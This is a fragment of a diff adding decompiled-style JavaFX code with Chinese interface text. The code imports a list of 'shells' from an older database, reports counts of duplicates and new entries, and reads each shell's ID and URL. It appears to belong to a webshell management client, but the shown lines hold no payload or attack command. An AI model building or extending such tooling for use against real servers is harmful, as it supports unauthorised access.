+            final Integer finalCount = count;
+            Platform.runLater(() -> {
+               this.statusLabel.setText("导入完成。");
+               Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalDuplicateCount, finalCount));
+
+               try {
+                  this.loadShellList();
+               } catch (Exception var5) {
+               }
+
+            });
+            oldShellManager.closeConnection();
+         };
+         Thread worker = new Thread(runner);
+         worker.start();
+      }
+   }
+
+   private String getSelectedShellID() {
+      return ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
+   }
+
+   private int getShellID(ArrayList item) {
+      return Integer.parseInt(((SimpleStringProperty)item.get(this.COL_INDEX_ID)).getValue());
+   }
+
+   private String getShellUrl(ArrayList item) {
+      return ((SimpleStringProperty)item.get(this.COL_INDEX_URL)).getValue();
    }
 }
